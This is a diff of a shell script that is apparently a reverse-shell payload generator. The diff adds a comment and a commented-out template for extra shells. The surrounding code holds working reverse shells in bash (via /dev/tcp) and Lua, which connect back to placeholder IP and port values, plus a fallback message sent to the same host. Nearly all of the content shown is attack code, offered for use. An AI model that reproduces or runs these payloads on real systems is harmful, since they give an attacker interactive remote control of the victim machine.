@@ -34,6 +34,8 @@ function print_banner(){
 	printf "\n"
 }
 
+# Shell commands:
+
 cmd='
 if command -v bash >/dev/null 2>&1; then
 	/bin/bash -i >& /dev/tcp/IP_REPLACE/PORT_REPLACE 0>&1
@@ -62,6 +64,12 @@ elif command -v ruby >/dev/null 2>&1; then
 elif command -v lua >/dev/null 2>&1; then
 	lua -e '\''require("socket");require("os");t=socket.tcp();t:connect("IP_REPLACE","PORT_REPLACE");os.execute("/bin/sh -i <&3 >&3 2>&3");'\''
 	exit;
+
+# Add your own reverse shells:
+#elif command -v [command] >/dev/null 2>&1; then
+#	[command rev shell]
+#	exit;
+
 else
 	echo "No programs installed!" > /dev/tcp/IP_REPLACE/PORT_REPLACE
 fi
